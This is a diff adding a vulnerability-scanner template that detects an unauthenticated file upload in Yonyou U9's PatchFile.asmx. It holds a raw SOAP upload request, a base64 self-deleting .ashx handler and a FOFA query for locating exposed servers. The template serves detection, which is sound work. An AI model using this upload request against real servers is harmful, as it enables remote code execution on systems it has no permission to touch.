@@ -1,0 +1,56 @@
+id: yonyou-u9-patchfile-upload
+
+info:
+  name: Yonyou U9 PatchFile.asmx - Unauthenticated Arbitrary File Upload
+  author: Co5mos,ProjectDiscoveryAI
+  severity: critical
+  description: |
+    An arbitrary file upload vulnerability in U9 PatchFile.asmx allows attackers to upload files to the server.This can lead to various security issues including remote code execution.
+  metadata:
+    verified: true
+    fofa-query: title="U9-登录"
+  tags: unauth,file-upload,yonyou,u9,rce
+
+variables:
+  filename: '{{rand_base(5)}}.ashx'
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        POST /CS/Office/AutoUpdates/PatchFile.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        SOAPAction: "http://tempuri.org/SaveFile"
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+          <SaveFile xmlns="http://tempuri.org/">
+            <binData>PCVAIFdlYkhhbmRsZXIgTGFuZ3VhZ2U9IkMjIiBDbGFzcz0iRGVsZXRlQ3VycmVudEZpbGUiICU+DQoNCiAgICB1c2luZyBTeXN0ZW07DQogICAgdXNpbmcgU3lzdGVtLldlYjsNCiAgICB1c2luZyBTeXN0ZW0uSU87DQoNCiAgICBwdWJsaWMgY2xhc3MgRGVsZXRlQ3VycmVudEZpbGUgOiBJSHR0cEhhbmRsZXIgew0KICAgICAgICANCiAgICAgICAgcHVibGljIHZvaWQgUHJvY2Vzc1JlcXVlc3QgKEh0dHBDb250ZXh0IGNvbnRleHQpIHsNCiAgICAgICAgICAgIGludCByZXN1bHQgPSAxMTExICogMjIyMjsNCiAgICAgICAgICAgIGNvbnRleHQuUmVzcG9uc2UuQ29udGVudFR5cGUgPSAidGV4dC9wbGFpbiI7DQogICAgICAgICAgICBjb250ZXh0LlJlc3BvbnNlLldyaXRlKHJlc3VsdCk7DQoNCiAgICAgICAgICAgIHN0cmluZyBmaWxlUGF0aCA9IGNvbnRleHQuU2VydmVyLk1hcFBhdGgoY29udGV4dC5SZXF1ZXN0LkN1cnJlbnRFeGVjdXRpb25GaWxlUGF0aCk7DQogICAgICAgICAgICBpZiAoRmlsZS5FeGlzdHMoZmlsZVBhdGgpKSB7DQogICAgICAgICAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgICAgICAgICAgRmlsZS5EZWxldGUoZmlsZVBhdGgpOw0KICAgICAgICAgICAgICAgICAgICBjb250ZXh0LlJlc3BvbnNlLldyaXRlKCJcbkZpbGUgZGVsZXRlZCBzdWNjZXNzZnVsbHkuIik7DQogICAgICAgICAgICAgICAgfSBjYXRjaCAoRXhjZXB0aW9uIGV4KSB7DQogICAgICAgICAgICAgICAgICAgIGNvbnRleHQuUmVzcG9uc2UuV3JpdGUoIlxuRXJyb3IgZGVsZXRpbmcgZmlsZTogIiArIGV4Lk1lc3NhZ2UpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgY29udGV4dC5SZXNwb25zZS5Xcml0ZSgiXG5GaWxlIG5vdCBmb3VuZC4iKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIA0KICAgICAgICBwdWJsaWMgYm9vbCBJc1JldXNhYmxlIHsNCiAgICAgICAgICAgIGdldCB7DQogICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0K             fQ0KICAgICAgICB9DQogICAgfQ==</binData>
+            <path>./</path>
+            <fileName>{{filename}}</fileName>
+          </SaveFile>
+          </soap:Body>
+        </soap:Envelope>
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<SaveFileResult>true</SaveFileResult>"
+        internal: true
+
+  - raw:
+      - |
+        GET /CS/Office/AutoUpdates/{{filename}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body, "2468642","File deleted successfully")
+        condition: and
+# digest: 4b0a00483046022100916eaddaa390f20f4990d96ae45f172e15d5ec5b96faffe151355760da55b249022100bc1433799c1366f6fad058b78825ddf35837dc0e2e7b7c57e094d8b5db5de934:922c64590222798bb761d5b6d8e72950
